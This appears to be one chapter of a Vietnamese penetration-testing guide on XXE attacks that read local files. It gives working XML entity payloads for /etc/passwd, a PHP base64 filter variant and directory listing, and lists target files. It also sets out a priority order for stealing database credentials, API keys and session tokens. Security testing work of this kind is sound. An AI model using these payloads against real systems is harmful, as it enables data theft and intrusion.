# Đọc File và Rò Rỉ Dữ Liệu Cục Bộ Qua XXE

## Mục Tiêu

Khai thác XXE để đọc file trên hệ thống parser đang chạy, từ đó thu thông tin hệ thống, config và secret.

## Mục Tiêu Thường Gặp

### Hệ Linux

- `/etc/hostname`
- `/etc/passwd`
- `/etc/shadow` (nếu process có quyền)
- File cấu hình của ứng dụng (đường dẫn tùy deployment)

### Hệ Windows

- `file:///c:/boot.ini`
- `file:///c:/windows/win.ini`
- `C:\windows\system32\drivers\etc\hosts`
- `web.config` (IIS/.NET deployments)

## Mẫu Payload Cơ Bản

### External Entity Cổ Điển

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

### Khai Báo Phần Tử Tường Minh

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ELEMENT stockCheck ANY>
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
  <productId>&file;</productId>
  <storeId>1</storeId>
</stockCheck>
```

### Bộ Bao PHP Filter (Phụ Thuộc Ngữ Cảnh)

```xml
<!DOCTYPE replace [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>
```

Dùng khi cần base64 để giữ nguyên ký tự và tránh vỡ syntax output.

## Kịch Bản Liệt Kê Thư Mục

Một số parser/runtime (thường gặp trong một số Java stack) có thể trả về listing nếu request đến directory:

```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/">]>
<root>&xxe;</root>
```

Điều này hữu ích cho trinh sát đường dẫn và quy ước đặt tên tệp.

## Chiến Lược Đặt Vị Trí Entity

Thành công phụ thuộc vào node nào được ứng dụng phản hồi:

1. Đặt entity vào từng data node một cách hệ thống.
2. So sánh nội dung phản hồi, mã trạng thái và độ dài.
3. Tìm node có reflection ổn định để trích xuất data.

## Ràng Buộc Thường Gặp

- File lớn hoặc nhiều newline có thể gây vấn đề hiển thị/exfil qua URL.
- Một số parser lọc output, chỉ trả một phần data.
- Quyền của process account quyết định file nào đọc được.
- WAF/validation có thể chặn `DOCTYPE` rõ ràng, cần dùng pattern bypass.

## Thứ Tự Ưu Tiên Mục Tiêu Thực Tế

1. `hostname`/`hosts` để xác nhận file read nhanh.
2. File cấu hình ứng dụng (db credentials, api keys).
3. Tham chiếu metadata cloud/bootstrap trong config.
4. File dữ liệu người dùng/log chứa session token.

## Thu Thập Bằng Chứng

Nên lưu:

- Toàn bộ request payload
- Đoạn response chứa data nhạy cảm
- Đường dẫn file đã đọc
- Mức quyền của process quan sát được

## Tệp Liên Quan

- [04-exploitation-workflow.md](04-exploitation-workflow.md)
- [06-ssrf-and-internal-recon.md](06-ssrf-and-internal-recon.md)
- [10-payloads-cheatsheet.md](10-payloads-cheatsheet.md)
